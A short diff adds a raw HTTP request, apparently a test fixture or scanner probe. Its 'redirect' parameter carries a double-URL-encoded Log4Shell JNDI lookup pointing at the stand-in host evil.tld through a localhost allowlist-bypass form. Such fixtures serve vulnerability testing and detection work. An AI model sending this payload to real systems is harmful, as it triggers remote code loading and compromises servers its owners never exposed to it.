@@ -1,0 +1,4 @@
+GET /a?redirect=%2524%257Bjndi%253Aldap%253A%252F%252F127.0.0.1%2523evil.tld%252Fx%257D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
